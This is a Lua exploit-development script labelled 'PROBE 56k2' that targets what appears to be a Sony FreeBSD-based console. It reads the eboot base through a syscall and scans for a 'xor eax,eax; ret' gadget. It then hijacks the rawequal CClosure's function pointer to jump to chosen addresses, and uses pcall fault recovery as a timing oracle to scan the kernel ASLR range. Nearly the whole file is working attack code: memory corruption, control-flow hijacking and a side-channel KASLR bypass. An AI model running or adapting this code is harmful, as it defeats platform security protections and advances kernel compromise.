-- CRASH_CLASS: MODERATE
-- PROBE 56k2: KASLR via signal handler fault recovery
--
-- Context: 56k confirmed sigaction(SIGSEGV) installs (ret=0).
-- Old handler was at eboot+offset (0x5BC898F4).
-- mincore crashed the process — skip all mincore/msync/madvise.
--
-- Plan:
--   [A] Setup + find gadget
--   [B] Install SIGSEGV handler
--   [C] Test fault recovery: redirect CClosure to unmapped userland VA
--   [D] If C survives: redirect to kernel VAs, time the fault
--   [E] If D shows timing diff: scan KASLR range

print("=== PROBE 56k2: SIGNAL ORACLE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X_%08X", h, l)
end

print("[A] Setup")
local sc_getpid = make_syscall(20)
local our_pid = to_num(sc_getpid())
print("  PID: " .. our_pid)

collectgarbage("stop")

-- Get eboot base
local sc_info = make_syscall(593)
local info_buf = memory.alloc(0x200)
safe_wd(info_buf, 0x160)
pcall(function() sc_info(uint64(0), info_buf) end)
local eb_lo = safe_rd(info_buf + 0x108) or 0
local eb_hi = safe_rd(info_buf + 0x10C) or 0
local eb_sz = safe_rd(info_buf + 0x110) or 0
local eb_base = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print(string.format("  eboot: 0x%X_%08X +0x%X", eb_hi, eb_lo, eb_sz))

-- Find xor eax,eax;ret gadget (31 C0 C3)
local gadget_ret0 = nil
local gadget_ret = nil
for off = 0, math.min(eb_sz - 3, 0x200000), 1 do
    local b = safe_rd(eb_base + off)
    if b then
        local b0 = b % 256
        local b1 = math.floor(b / 256) % 256
        local b2 = math.floor(b / 65536) % 256
        if not gadget_ret0 and b0 == 0x31 and b1 == 0xC0 and b2 == 0xC3 then
            gadget_ret0 = eb_base + off
            print(string.format("  xor eax,eax;ret at +0x%X", off))
        end
        if not gadget_ret and b0 == 0xC3 then
            gadget_ret = eb_base + off
        end
        if gadget_ret0 then break end
    end
end

-- Get rawequal CClosure
local re_str = tostring(rawequal)
local re_hex = re_str:match("(0x[0-9a-fA-F]+)")
local cc_addr = nil
if re_hex then
    cc_addr = uint64(re_hex)
    print("  rawequal CClosure: " .. re_hex)
else
    -- tostring returns decimal like "function: 310697820"
    local re_dec = re_str:match(": (%d+)")
    if re_dec then
        local dec_val = tonumber(re_dec)
        local hex_str = string.format("0x%X", dec_val)
        cc_addr = uint64(hex_str)
        print("  rawequal CClosure: " .. re_dec .. " -> " .. hex_str)
    end
end

if not cc_addr then
    print("FATAL: no CClosure address")
    return
end

local orig_fn = safe_rq(cc_addr + 0x20)
print("  original +0x20: " .. hexval(orig_fn))

-- Timer
local sc_clock = make_syscall(232)
local ts_buf = memory.alloc(16)
local function get_ns()
    safe_wq(ts_buf, uint64(0))
    safe_wq(ts_buf + 8, uint64(0))
    pcall(function() sc_clock(uint64(4), uint64(ts_buf)) end)
    local sec = safe_rd(ts_buf) or 0
    local nsec = safe_rd(ts_buf + 8) or 0
    return sec * 1000000000 + nsec
end

-- Verify timer works
local t1 = get_ns()
local t2 = get_ns()
print(string.format("  timer delta: %d ns", t2 - t1))

-- ============================================================
-- [B] Install SIGSEGV handler
-- Use the OLD handler address (0x5BC898F4 range) — that's the Lua
-- runtime's own crash handler. Or use our gadget.
-- Actually: try installing xor eax,eax;ret as handler.
-- When SIGSEGV fires, handler runs, returns 0, then the signal
-- trampoline calls sigreturn with the ORIGINAL faulting context.
-- This will LOOP (re-execute the fault). We need to modify ucontext.
--
-- Alternative approach: try SIG_IGN (handler=1) first.
-- On FreeBSD, SIG_IGN for SIGSEGV is supposed to be rejected...
-- but Sony might allow it.
--
-- Better: use SA_RESETHAND (0x4) so handler runs once then resets.
-- After reset, the next SIGSEGV kills process. This doesn't loop
-- but only gives us ONE fault recovery.
--
-- Best: keep the Lua runtime's original handler intact. The runtime
-- may use setjmp/longjmp for its pcall implementation. If the
-- original handler does longjmp, pcall would catch the fault!
-- ============================================================
print("")
print("[B] Signal handler setup")

local sc_sigaction = make_syscall(416)

-- First: read the CURRENT handler (the runtime's)
local sa_old = memory.alloc(0x40)
for i = 0, 15 do safe_wd(sa_old + i*4, 0) end

local sa_ok, sa_ret = pcall(function()
    return sc_sigaction(uint64(11), uint64(0), uint64(sa_old))
end)
local sa_rv = sa_ok and to_num(sa_ret) or -999
print("  read current handler: ret=" .. sa_rv)

local cur_handler = safe_rq(sa_old)
local cur_flags = safe_rd(sa_old + 8) or 0
print("  current handler: " .. hexval(cur_handler))
print(string.format("  current flags: 0x%X", cur_flags))

-- Test: does the EXISTING handler let pcall recover from a fault?
-- Try redirecting CClosure to a definitely-unmapped USERLAND address
-- If pcall catches it, the runtime's handler works for us!
print("")
print("[C] Fault recovery test (unmapped userland)")
print("  redirecting rawequal to 0x00007FFF_DEAD0000...")
print("  (if no output after this, process crashed)")

safe_wq(cc_addr + 0x20, uint64("0x00007FFFDEAD0000"))
local fault_ok, fault_ret = pcall(function() return rawequal(1, 2) end)
safe_wq(cc_addr + 0x20, orig_fn)

print("  pcall returned: ok=" .. tostring(fault_ok) .. " ret=" .. tostring(fault_ret))

if not fault_ok then
    print("  ** pcall CAUGHT the fault! **")
    print("  Lua runtime signal handler does longjmp recovery!")

    -- Now test with kernel VAs
    print("")
    print("[D] Kernel VA fault timing")

    local test_addrs = {
        {name="unmapped user",    addr="0x00007FFFDEAD0000"},
        {name="unmapped kernel",  addr="0xFFFFFFFFF0000000"},
        {name="KERNBASE",         addr="0xFFFFFFFF80000000"},
        {name="KERNBASE+170MB",   addr="0xFFFFFFFF8A9C0000"},
        {name="KERNBASE+485MB",   addr="0xFFFFFFFF9E3F0000"},
        {name="KERNBASE+100MB",   addr="0xFFFFFFFF86400000"},
        {name="KERNBASE+300MB",   addr="0xFFFFFFFF92C00000"},
        {name="KERNBASE+600MB",   addr="0xFFFFFFFFA5800000"},
        {name="KERNBASE+800MB",   addr="0xFFFFFFFFB0000000"},
        {name="KERNBASE+1GB",     addr="0xFFFFFFFFC0000000"},
    }

    local ITERS = 50

    for _, t in ipairs(test_addrs) do
        local sum_t = 0
        local samples = {}
        local all_ok = true

        for i = 1, ITERS do
            local ta = get_ns()
            safe_wq(cc_addr + 0x20, uint64(t.addr))
            local ok = pcall(function() return rawequal(1, 2) end)
            safe_wq(cc_addr + 0x20, orig_fn)
            local tb = get_ns()
            if not ok then
                sum_t = sum_t + (tb - ta)
                if i <= 5 then samples[i] = tb - ta end
            else
                -- Unexpectedly succeeded?!
                print(string.format("  ** %s: rawequal SUCCEEDED (addr is executable!) **", t.name))
                all_ok = false
                break
            end
        end

        if all_ok then
            print(string.format("  %s: avg=%d ns  [%s]",
                t.name, sum_t / ITERS,
                table.concat({
                    tostring(samples[1] or 0),
                    tostring(samples[2] or 0),
                    tostring(samples[3] or 0),
                    tostring(samples[4] or 0),
                    tostring(samples[5] or 0)
                }, ",")))
        end
    end

    -- ============================================================
    -- [E] KASLR scan if timing oracle works
    -- Scan KERNBASE to KERNBASE+1GB in 2MB steps
    -- Look for timing anomalies
    -- ============================================================
    print("")
    print("[E] KASLR range scan (2MB steps, 0x80000000-0xC0000000)")

    local SCAN_ITERS = 30
    local KERNBASE_HI = 0xFFFFFFFF
    local KERNBASE_LO = 0x80000000
    local STEP = 0x200000
    local NUM_CAND = 512  -- 1GB / 2MB

    -- Get baseline: unmapped kernel VA timing
    local baseline_sum = 0
    for i = 1, SCAN_ITERS do
        local ta = get_ns()
        safe_wq(cc_addr + 0x20, uint64("0xFFFFFFFFF0000000"))
        pcall(function() return rawequal(1, 2) end)
        safe_wq(cc_addr + 0x20, orig_fn)
        local tb = get_ns()
        baseline_sum = baseline_sum + (tb - ta)
    end
    local baseline_avg = baseline_sum / SCAN_ITERS
    print(string.format("  baseline (unmapped): %d ns", baseline_avg))

    -- Threshold: 20% deviation from baseline
    local threshold = baseline_avg * 0.2

    local hits = {}
    for ci = 0, NUM_CAND - 1 do
        local cand_lo = KERNBASE_LO + ci * STEP
        local cand_hi = KERNBASE_HI
        local addr_str = string.format("0x%08X%08X", cand_hi, cand_lo)

        local sum_c = 0
        for i = 1, SCAN_ITERS do
            local ta = get_ns()
            safe_wq(cc_addr + 0x20, uint64(addr_str))
            pcall(function() return rawequal(1, 2) end)
            safe_wq(cc_addr + 0x20, orig_fn)
            local tb = get_ns()
            sum_c = sum_c + (tb - ta)
        end
        local avg_c = sum_c / SCAN_ITERS

        if math.abs(avg_c - baseline_avg) > threshold then
            hits[#hits + 1] = {addr=addr_str, avg=avg_c, diff=avg_c - baseline_avg}
            print(string.format("  HIT: %s avg=%d diff=%+d", addr_str, avg_c, avg_c - baseline_avg))
        end

        -- Progress every 64 candidates
        if ci % 64 == 63 then
            print(string.format("  ...scanned %d/%d", ci + 1, NUM_CAND))
        end
    end

    print(string.format("  scan complete: %d hits / %d candidates", #hits, NUM_CAND))

    if #hits > 0 and #hits < 20 then
        print("")
        print("  Top hits:")
        for _, h in ipairs(hits) do
            print(string.format("    %s avg=%d diff=%+d", h.addr, h.avg, h.diff))
        end
    elseif #hits >= 20 then
        print("  too many hits — oracle too noisy or no differentiation")
    else
        print("  no timing anomalies found")
    end

elseif fault_ok then
    print("  rawequal SUCCEEDED with unmapped addr — unexpected!")
    print("  ret=" .. tostring(fault_ret))
    -- This means the fault didn't happen? Or the function somehow ran?
    -- Try reading what rawequal returned

    -- Try with a kernel VA
    print("")
    print("[D] Testing kernel VA (non-fault path)")
    safe_wq(cc_addr + 0x20, uint64("0xFFFFFFFF80000000"))
    local k_ok, k_ret = pcall(function() return rawequal(1, 2) end)
    safe_wq(cc_addr + 0x20, orig_fn)
    print("  kernel VA: ok=" .. tostring(k_ok) .. " ret=" .. tostring(k_ret))
else
    print("  PROCESS SURVIVED but pcall behavior unclear")
    print("  fault_ok type: " .. type(fault_ok))
end

collectgarbage("restart")

print("")
print("=== PROBE 56k2 COMPLETE ===")
